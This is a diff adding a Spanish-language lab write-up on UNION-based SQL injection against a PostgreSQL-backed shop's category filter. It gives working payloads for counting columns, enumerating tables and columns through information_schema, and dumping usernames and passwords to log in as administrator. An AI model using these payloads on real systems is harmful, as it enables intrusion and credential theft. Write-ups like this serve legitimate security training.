@@ -1,0 +1,47 @@
+Write-up: SQL Injection — Listing Database Contents (Non-Oracle)
+Objetivo
+Extraer las credenciales del usuario administrator de una base de datos PostgreSQL a través de un parámetro vulnerable a SQL injection.
+
+Reconocimiento inicial
+La aplicación es un e-commerce con un filtro de categorías. La URL tiene esta forma:
+/filter?category=Gifts
+
+Paso 1 — Confirmar que es UNION-based
+Para extraer datos con UNION, la query inyectada necesita tener el mismo número de columnas que la original. Probamos:
+sql' ORDER BY 1--
+' ORDER BY 2--
+' ORDER BY 3--  ← error 500
+Cuando ORDER BY 3 rompe, sabemos que la query original devuelve 2 columnas.
+Luego verificamos qué columnas aceptan texto (necesario para exfiltrar strings):
+sql' UNION SELECT 'test',NULL--
+Funciona → la primera columna acepta texto. Con eso confirmamos que el UNION es viable.
+
+Paso 2 — Identificar el motor de base de datos
+Las tablas del sistema que aparecen (pg_class, pg_namespace, pg_attribute, etc.) son exclusivas de PostgreSQL. Esto es importante porque la sintaxis varía entre motores:
+MotorCatálogo de tablasPostgreSQL / MySQLinformation_schema.tablesOracleall_tablesMSSQLsys.tables
+
+Paso 3 — Enumerar tablas
+sql' UNION SELECT table_name,NULL FROM information_schema.tables--
+La respuesta devolvió decenas de tablas del sistema (pg_*) más dos relevantes:
+
+products — la tabla de la app
+users_dlkevr — la tabla de usuarios (nombre randomizado por el lab)
+
+Razonamiento: ignoramos todo lo que empieza con pg_ o viene de information_schema — son tablas internas del motor. Nos quedamos con las tablas de la aplicación.
+
+Paso 4 — Enumerar columnas de la tabla target
+sql' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_dlkevr'--
+Resultado:
+email
+password_jvltqv
+username_lkbfib
+Los nombres también están randomizados (_jvltqv, _lkbfib), por eso no podemos asumir que se llaman simplemente username y password — hay que enumerarlos.
+
+Paso 5 — Extraer credenciales
+Con los nombres exactos de columnas, la query final:
+sql' UNION SELECT username_lkbfib,password_jvltqv FROM users_dlkevr--
+Esto devuelve todas las filas de la tabla de usuarios. Buscamos la fila donde username_lkbfib = administrator y tomamos su contraseña.
+
+Paso 6 — Login
+Vamos a /my-account, ingresamos administrator + la password extraída → lab resuelto.
+
